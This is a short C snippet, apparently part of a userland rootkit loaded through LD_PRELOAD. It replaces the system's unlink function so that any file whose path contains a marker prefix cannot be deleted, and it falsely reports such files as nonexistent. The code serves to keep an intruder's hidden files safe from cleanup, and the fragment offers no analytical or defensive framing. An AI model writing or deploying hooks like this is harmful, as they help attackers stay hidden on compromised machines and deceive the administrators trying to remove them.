int unlink(const char *pathname) {
	if (!orig_unlink)
		orig_unlink = dlsym(RTLD_NEXT,"unlink");
	if (debug == 1)
		printf("\nunlink  : %s\n", pathname);
	if (strstr(pathname, BDS_PREFIX)) {
		errno = ENOENT;
		return -1;
	}
    
	return orig_unlink(pathname);
}